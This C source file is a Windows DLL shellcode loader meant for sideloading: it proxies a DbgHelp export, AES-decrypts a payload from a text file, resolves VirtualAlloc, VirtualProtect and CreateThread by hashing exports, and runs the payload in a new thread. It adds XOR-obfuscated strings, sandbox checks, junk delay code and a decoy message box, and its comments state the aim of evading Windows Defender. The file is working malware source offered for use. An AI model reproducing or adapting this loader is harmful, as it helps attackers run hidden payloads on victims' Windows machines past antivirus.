#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#define EXPORT_DIRECTORY_INDEX 0
	
uint8_t sbox_k[256] = {
	0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
	0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
	0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,
	0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
	0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc,
	0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
	0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a,
	0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
	0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0,
	0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
	0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b,
	0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
	0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85,
	0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
	0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5,
	0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
	0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17,
	0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
	0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88,
	0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
	0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c,
	0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
	0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9,
	0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
	0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6,
	0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
	0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e,
	0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
	0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94,
	0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
	0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68,
	0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
};
const uint8_t inv_sbox_k[256] = {
	0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38,
	0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,
	0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87,
	0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,
	0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D,
	0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,
	0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2,
	0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,
	0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16,
	0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,
	0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA,
	0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,
	0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A,
	0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,
	0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02,
	0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,
	0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA,
	0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,
	0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85,
	0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,
	0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89,
	0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,
	0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20,
	0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,
	0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31,
	0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,
	0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D,
	0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,
	0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0,
	0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,
	0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26,
	0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,
};
uint8_t Rcon[10] = {
0x01,
0x02,
0x04,
0x08,
0x10,
0x20,
0x40,
0x80,
0x1B,
0x36
};



void RetrieveAppConfig(const char* key, const char* enc_string, char* output) {
	int len = strlen(enc_string);
	int keylen = strlen(key);
	for (int i = 0; i < len; i++) {
		output[i] = enc_string[i] ^ key[i % keylen];
	}
	output[len] = '\0';
}

void DecodeRawString(const char* key, const uint8_t* enc_string, int length, char* output) {
	int keylen = strlen(key);
	for (int i = 0; i < length; i++) {
		output[i] = enc_string[i] ^ key[i % keylen];
	}
	output[length] = '\0';
}


void RefreshAppState() {
	int dummy = 0;
	for (int i = 0; i < 3; i++) {
		dummy += i;
	}
	if (dummy > 1000) {
		puts("Outdated state");
	}
}



DWORD djb2_hash(const char* name_of_function) {
	DWORD hash_val = 5381;
	int len_of_func = strlen(name_of_function);
	for (int i = 0; i < len_of_func; i++) {
		hash_val = ((hash_val << 5) + hash_val) + (BYTE)(name_of_function[i]);
	}

	return (DWORD)hash_val;
}


void cpu_delay_via_prime_factors(unsigned long long n) {
	for (unsigned long long i = 2; i * i <= n; i++) {
		while (n % i == 0) {
			n /= i;
		}
	}
	if (n > 1) {
		
	}
}


void ValidateUserInput() {
	char tmp[] = "User";
	for (int i = 0; i < strlen(tmp); i++) {
		tmp[i] ^= 0x42;
	}
}


int CheckHostCompatibility() {

	MEMORYSTATUSEX memStatus;
	memStatus.dwLength = sizeof(memStatus);
	GlobalMemoryStatusEx(&memStatus);
	DWORDLONG totalRAM_MB = memStatus.ullTotalPhys / (1024 * 1024);

	if (totalRAM_MB < 2048) {  
		return 1;
	}

	
	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);

	if (sysInfo.dwNumberOfProcessors < 2) {  
		return 1;
	}

	return 0; 
}

void ClearTempBuffer() {
	char buf[256] = { 0 };
	memset(buf, 0, sizeof(buf));
}




FARPROC ResolveProcByHash(HMODULE hModule, DWORD target_hash) {
	IMAGE_DOS_HEADER* k_dosh = (IMAGE_DOS_HEADER*)hModule;
	IMAGE_NT_HEADERS* k_nth = (IMAGE_NT_HEADERS*)((BYTE*)hModule + k_dosh->e_lfanew);
	DWORD Export_table_VA = k_nth->OptionalHeader.DataDirectory[EXPORT_DIRECTORY_INDEX].VirtualAddress;
	IMAGE_EXPORT_DIRECTORY* Export_Table = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + Export_table_VA);
	DWORD* Address_Name_Of_Functions = (DWORD*)((BYTE*)hModule + Export_Table->AddressOfNames);
	DWORD* Address_Of_Functions = (DWORD*)((BYTE*)hModule + Export_Table->AddressOfFunctions);


	for (int i = 0; i < Export_Table->NumberOfNames; i++) {
		char* name_of_export_function_iteration = (char*)((BYTE*)hModule + Address_Name_Of_Functions[i]);

		if (djb2_hash(name_of_export_function_iteration) == target_hash) {
			// We will implement a dbj2 hashing function to compare them, just consider this for now
			// Code that will run the thing
			void* FuncAddr = (void*)((BYTE*)hModule + Address_Of_Functions[i]);
			return (FARPROC)FuncAddr;
		}
	}
}

void SubstituteBlockValues(uint8_t mw[4]) {
	for (int i = 0; i < 4; i++) {
		mw[i] = sbox_k[mw[i]];
	}
}

void RotateConfigBlock(uint8_t mw[4]) {
	uint8_t temp = mw[0];
	mw[0] = mw[1];
	mw[1] = mw[2];
	mw[2] = mw[3];
	mw[3] = temp;
}



void InitializeKeyTable(const uint8_t* imp, uint8_t expandedkey[172]) {
	
	uint8_t W[44][4];

	for (int i = 0; i < 4; i++) {
		W[i][0] = imp[4 * i];
		W[i][1] = imp[4 * i + 1];
		W[i][2] = imp[4 * i + 2];
		W[i][3] = imp[4 * i + 3];
	}

	for (int i = 4; i < 44; i++) {
		uint8_t temp[4];
		memcpy(temp, W[i - 1], 4);

		if (i % 4 == 0) {
			RotateConfigBlock(temp);
			SubstituteBlockValues(temp);
			temp[0] ^= Rcon[i / 4];
		};

		for (int j = 0; j < 4; j++) {
			W[i][j] = W[i - 4][j] ^ temp[j];
		}

	}
	for (int i = 0; i < 44; i++) {
		for (int j = 0; j < 4; j++) {
			expandedkey[i * 4 + j] = W[i][j];
		}
	}
}


void AES_STATE(uint8_t matrix[4][4], const uint8_t* inp) {
	for (int row = 0; row < 4; row++) {
		for (int col = 0; col < 4; col++) {
			matrix[row][col] = (inp[4 * col + row]);
		}
	}
}

void MergeKeyMaterial(uint8_t matrix[4][4], uint8_t* round10key) {
	for (int i = 0; i < 4; i++) {
		for (int j = 0; j < 4; j++) {
			matrix[i][j] ^= round10key[4 * i + j];
		}
	}
}

uint8_t xtime(uint8_t x) {
	return ((x << 1) ^ (((x >> 7) & 1) * 0x1b));
}


uint8_t gmul(uint8_t a, uint8_t b) {
	uint8_t p = 0;
	for (int i = 0; i < 8; i++) {
		if (b & 1)
			p ^= a;
		bool hi_bit_set = (a & 0x80);
		a <<= 1;
		if (hi_bit_set)
			a ^= 0x1b; 
		b >>= 1;
	}
	return p;
}


void invshiftrow(uint8_t state[4][4]) {
	uint8_t temp;

	temp = state[1][3];
	state[1][3] = state[1][2];
	state[1][2] = state[1][1];
	state[1][1] = state[1][0];
	state[1][0] = temp;

	temp = state[2][0];
	state[2][0] = state[2][2];
	state[2][2] = temp;
	temp = state[2][1];
	state[2][1] = state[2][3];
	state[2][3] = temp;

	temp = state[3][0];
	state[3][0] = state[3][1];
	state[3][1] = state[3][2];
	state[3][2] = state[3][3];
	state[3][3] = temp;
}

void invsubbyte(uint8_t state[4][4]) {
	for (int row = 0; row < 4; row++) {
		for (int col = 0; col < 4; col++) {
			state[row][col] = inv_sbox_k[state[row][col]];
		}
	}
}

void InvMixColumns(uint8_t state[4][4]) {
	uint8_t temp[4];

	for (int col = 0; col < 4; col++) {
		temp[0] = gmul(state[0][col], 14) ^ gmul(state[1][col], 11) ^ gmul(state[2][col], 13) ^ gmul(state[3][col], 9);
		temp[1] = gmul(state[0][col], 9) ^ gmul(state[1][col], 14) ^ gmul(state[2][col], 11) ^ gmul(state[3][col], 13);
		temp[2] = gmul(state[0][col], 13) ^ gmul(state[1][col], 9) ^ gmul(state[2][col], 14) ^ gmul(state[3][col], 11);
		temp[3] = gmul(state[0][col], 11) ^ gmul(state[1][col], 13) ^ gmul(state[2][col], 9) ^ gmul(state[3][col], 14);

		for (int row = 0; row < 4; row++) {
			state[row][col] = temp[row];
		}
	}
}


BOOL check_current_priv() {
	HANDLE proc_hand = GetCurrentProcess();
	HANDLE token_hand;
	TOKEN_ELEVATION Elevation;
	DWORD size;

	if (!OpenProcessToken(proc_hand, TOKEN_QUERY, &token_hand)) {
		return FALSE;
	}

	if (!GetTokenInformation(token_hand, TokenElevation, &Elevation, sizeof(Elevation), &size)) {
		CloseHandle(token_hand);
		return FALSE;
	}

	CloseHandle(token_hand);

	return (Elevation.TokenIsElevated == 1);
}




BOOL check_win_ver() {
	HKEY helloKey;
	char p_name[256];
	DWORD current_size;

	RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &helloKey);
	current_size = sizeof(p_name);
	RegQueryValueExA(helloKey, "ProductName", NULL, NULL, (LPBYTE)p_name, &current_size);

	if (strstr(p_name, "Windows 10") != NULL) {
		return TRUE;
	}
	else {
		return FALSE;
	}
}


void RunSecureDecode(uint8_t matrix[4][4], uint8_t k_expandedkey[176], uint8_t decoded_output[16]) {
	MergeKeyMaterial(matrix, &k_expandedkey[160]); 

	for (int i = 9; i >= 1; i--) {
		invshiftrow(matrix);
		invsubbyte(matrix);
		MergeKeyMaterial(matrix, &k_expandedkey[i * 16]);
		InvMixColumns(matrix);
	}

	invshiftrow(matrix);
	invsubbyte(matrix);
	MergeKeyMaterial(matrix, &k_expandedkey[0]);

	int idx = 0;
	for (int col = 0; col < 4; col++) {
		for (int row = 0; row < 4; row++) {
			decoded_output[idx++] = matrix[row][col];
		}
	}
}

// Finished, Now, Utilizing an external file to parse, collect and combine the encrypted payload as a possible way to further evade
// Finished, Now, Further XORing all strings such as RED.txt and kernel32.dll, also incorping PE Parsing for "CreateThread" or some other API call maybe even syscalls
// Finished, Also added some anti Sandbox capability. Now, Lets make this into a DLL, but I will check this again, I do want to keep on checking until it finally evades Windows Defender.

void sigaltring4confirmationlmaook() {

}

void CopyFilesToTemp() {
	char tempPath[MAX_PATH];
	GetEnvironmentVariableA("TEMP", tempPath, MAX_PATH);
	

	char currentDir[MAX_PATH];
	GetModuleFileNameA(NULL, currentDir, MAX_PATH);

	// Strip the filename to get only the directory path
	for (int i = strlen(currentDir) - 1; i >= 0; --i) {
		if (currentDir[i] == '\\') {
			currentDir[i] = '\0';
			break;
		}
	}

	char srcExe[MAX_PATH], srcDll[MAX_PATH];
	snprintf(srcExe, MAX_PATH, "%s\\updater\\REDACTED.exe", currentDir);
	snprintf(srcDll, MAX_PATH, "%s\\updater\\REDACTED.dll", currentDir);

	char dstExe[MAX_PATH], dstDll[MAX_PATH];
	snprintf(dstExe, MAX_PATH, "%s\\REDACTED.exe", tempPath);
	snprintf(dstDll, MAX_PATH, "%s\\REDACTED.dll", tempPath);

	CopyFileA(srcExe, dstExe, FALSE);
	CopyFileA(srcDll, dstDll, FALSE);

}

BOOL WINAPI stub_MiniDumpWriteDump(...) {
	return TRUE;
}

BOOL WINAPI stub_SymInitialize(...) {
	return TRUE;
}

BOOL WINAPI stub_SymCleanup(...) {
	return TRUE;
}


typedef PIMAGE_NT_HEADERS(WINAPI* _ImageNtHeader)(PVOID);
_ImageNtHeader real_ImageNtHeader = NULL;
HMODULE hRealDbgHelp = NULL;

// Function to load the real REDACTED.dll
void LoadRealDbgHelp() {
	if (!hRealDbgHelp) {
		hRealDbgHelp = LoadLibraryA("C:\\Windows\\System32\\REDACTED.dll");
		if (hRealDbgHelp) {
			real_ImageNtHeader = (_ImageNtHeader)GetProcAddress(hRealDbgHelp, "ImageNtHeader");
		}
	}
}



DWORD WINAPI MyCoolEntryFunction(LPVOID lpParam) {

	Sleep(1500);
	cpu_delay_via_prime_factors(9999999967ULL);

	if (CheckHostCompatibility()) {
		ExitProcess(0);
	}

	Sleep(500);
	MessageBoxA(NULL,
		"Some components are still being initialized.\n"
		"Please wait or restart REDACTED if this persists.",
		"REDACTED",
		MB_OK | MB_ICONWARNING);



	// Close handles to avoid leaks (optional)
	/*CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);*/


	cpu_delay_via_prime_factors(999999967ULL);


	const uint8_t enc_file_name[] = { "\x08\x00\x08\xRED" };
	const char enc_k32_name[] = "\x0f\x0a\x1d\RED";
	char k32_dec[256];
	char filename[256];
	DecodeRawString("RED", enc_file_name, 9, filename);
	RetrieveAppConfig("RED", enc_k32_name, k32_dec);
	FILE* file = fopen("RED.txt", "r");
	if (!file) {
		perror("File open failed");
		return 1;
	}

	char line[256];
	uint8_t encrypted[2224];
	int i = 0;

	while (fgets(line, sizeof(line), file)) {
		// Search for "0x" in the line
		char* hex_ptr = strstr(line, "0x");
		if (hex_ptr) {
			unsigned int byte;
			if (sscanf(hex_ptr, "0x%x", &byte) == 1) {
				encrypted[i++] = (uint8_t)byte;
			}
			else {
				printf("Failed to parse hex from: %s\n", hex_ptr);
			}
		}
	}


	fclose(file);




	uint8_t key[16] = {
	//REDACTED
	};




	uint8_t expandedkey[176];
	InitializeKeyTable(key, expandedkey);


	uint8_t decrypted[sizeof(encrypted)];
	for (int i = 0; i < sizeof(encrypted); i += 16) {
		uint8_t state[4][4];
		AES_STATE(state, &encrypted[i]);
		RunSecureDecode(state, expandedkey, &decrypted[i]);
	}

	// ---------------------
	// ---------------------
	SIZE_T total_decrypted_size = sizeof(decrypted);  
	uint8_t padding_len = decrypted[total_decrypted_size - 1];

	// Padding preview debug
	//char msg[128];
	//char* preview = (char*)decrypted + total_decrypted_size - 16;

	//snprintf(msg, sizeof(msg),
	//	"%02X %02X %02X %02X %02X %02X %02X %02X\n%02X %02X %02X %02X %02X %02X %02X %02X",
	//	(uint8_t)preview[0], (uint8_t)preview[1], (uint8_t)preview[2], (uint8_t)preview[3],
	//	(uint8_t)preview[4], (uint8_t)preview[5], (uint8_t)preview[6], (uint8_t)preview[7],
	//	(uint8_t)preview[8], (uint8_t)preview[9], (uint8_t)preview[10], (uint8_t)preview[11],
	//	(uint8_t)preview[12], (uint8_t)preview[13], (uint8_t)preview[14], (uint8_t)preview[15]
	//);
	//MessageBoxA(NULL, msg, "Padding Preview", MB_OK);

	// Padding validation
	if (padding_len == 0 || padding_len > 16) {
		MessageBoxA(NULL, "Decryption failed: Invalid padding length.", "Error", MB_ICONERROR);
		ExitProcess(1);
	}

	// Check if all padding bytes are correct
	for (int i = 1; i <= padding_len; i++) {
		if (decrypted[total_decrypted_size - i] != padding_len) {
			MessageBoxA(NULL, "Decryption failed: Padding bytes are invalid.", "Error", MB_ICONERROR);
			ExitProcess(1);
		}
	}


	SIZE_T sc_size = total_decrypted_size - padding_len;

	// ---------------------
	//FILE* f = fopen("output.txt", "w");
	//if (!f) {
	//	MessageBoxA(NULL, "Failed to open output.txt for writing", "Error", MB_ICONERROR);
	//	ExitProcess(1);
	//}

	//// Write in \xHH format
	//for (SIZE_T i = 0; i < sc_size; i++) {
	//	fprintf(f, "\\x%02x", decrypted[i]); // Lowercase hex to match msfvenom
	//	// Optional: newline every 16 bytes for readability
	//	if ((i + 1) % 16 == 0) {
	//		fprintf(f, "\n");
	//	}
	//}

	//fclose(f);
	//MessageBoxA(NULL, "Shellcode dumped in msfvenom format to output.txt", "Done", MB_OK);

	// ---------------------
	typedef LPVOID(WINAPI* VA)(LPVOID, SIZE_T, DWORD, DWORD);
	VA mVA = (VA)ResolveProcByHash(GetModuleHandleA(k32_dec), 942411671);

	typedef HANDLE(WINAPI* CT)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
	CT mCT = (CT)ResolveProcByHash(GetModuleHandleA(k32_dec), 2131293265);

	typedef DWORD(WINAPI* WFSO)(HANDLE, DWORD);
	WFSO mWFSO = (WFSO)ResolveProcByHash(GetModuleHandleA(k32_dec), 3972899258);

	typedef BOOL(WINAPI* VP)(LPVOID, SIZE_T, DWORD, PDWORD);
	VP mVP = (VP)ResolveProcByHash(GetModuleHandleA(k32_dec), 2219831693);

	// VirtualAlloc
	LPVOID mem_loc = mVA(NULL, sc_size, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE);
	if (mem_loc == NULL) {
		MessageBoxA(NULL, "VA failed.", "Error", MB_ICONERROR);
		ExitProcess(1);
	}

	memcpy(mem_loc, decrypted, sc_size);

	// VirtualProtect
	DWORD oldProtect;
	if (!mVP(mem_loc, sc_size, PAGE_EXECUTE_READ, &oldProtect)) {
		MessageBoxA(NULL, "VP failed. Also a change", "Error", MB_ICONERROR);
		ExitProcess(1);
	}

	// CreateThread
	HANDLE thread = mCT(NULL, 0, (LPTHREAD_START_ROUTINE)mem_loc, NULL, 0, NULL);
	if (thread == NULL) {
		MessageBoxA(NULL, "CT failed.", "Error", MB_ICONERROR);
		ExitProcess(1);
	}
	CopyFilesToTemp();
	// Wait for the thread to finish
	mWFSO(thread, INFINITE);

	return 0;
}



BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	if (fdwReason == DLL_PROCESS_ATTACH) {
		LoadRealDbgHelp();


		CreateThread(NULL, 0, MyCoolEntryFunction, NULL, 0, NULL);
	}
	return TRUE;
}


__declspec(dllexport) PIMAGE_NT_HEADERS WINAPI ImageNtHeader(PVOID base) {
	if (real_ImageNtHeader) {
		return real_ImageNtHeader(base);
	}
	return NULL;

}


